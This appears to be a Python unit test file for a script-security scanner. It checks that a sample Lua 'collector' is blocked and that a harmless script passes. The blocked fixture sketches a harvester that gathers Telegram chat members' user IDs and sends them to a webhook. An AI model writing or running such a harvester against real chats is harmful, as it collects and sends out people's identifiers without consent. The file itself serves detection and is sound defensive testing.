import tempfile
import unittest
from pathlib import Path

from core.script_security import analyze_script


class ScriptSecurityTests(unittest.TestCase):
    def test_blocks_telegram_id_harvester(self):
        with tempfile.TemporaryDirectory() as folder:
            sample = Path(folder) / "collector.lua"
            sample.write_text(
                "local telegram = require('telegram')\n"
                "for _, user in getChatMembers(chat) do table.insert(ids, user.user_id) end\n"
                "local suspects = {180727364, 190007471}\n"
                "local output = io.open('ids.txt', 'w')\n"
                "http.request(webhook, ids)\n",
                encoding="utf-8",
            )
            result = analyze_script(sample, sample.name)
        self.assertEqual(result["verdict"], "block")
        self.assertGreaterEqual(result["score"], 80)
        self.assertEqual(result["candidate_ids"], ["180727364", "190007471"])

    def test_allows_unrelated_source(self):
        with tempfile.TemporaryDirectory() as folder:
            sample = Path(folder) / "hello.py"
            sample.write_text("print('hola')\n", encoding="utf-8")
            result = analyze_script(sample, sample.name)
        self.assertEqual(result["verdict"], "clean")


if __name__ == "__main__":
    unittest.main()
